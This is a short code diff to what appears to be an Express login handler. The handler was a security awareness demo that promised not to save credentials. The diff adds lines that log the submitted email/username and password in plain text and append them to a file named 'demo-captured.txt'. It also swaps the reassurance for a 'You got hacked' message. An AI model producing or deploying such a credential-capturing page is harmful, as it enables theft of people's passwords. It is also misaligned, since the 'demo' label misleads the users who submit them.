@@ -15,16 +15,18 @@ app.get("/", (req, res) => {
 
 app.post("/login", (req, res) => {
   const log = `
-=== Demo Submission Event ===
+=== Demo Captured Data ===
+Email/Username: ${email}
+Password: ${password}
 Time: ${new Date().toLocaleString()}
 ==========================
 `;
 
   console.log(log);
+  fs.appendFileSync("demo-captured.txt", log);
 
   res.send(`
-    <h1>Security awareness demo</h1>
-    <p>This simulated login form did not save your email or password.</p>
+     <h1>You got hacked 💀</h1>
   `);
 });
 
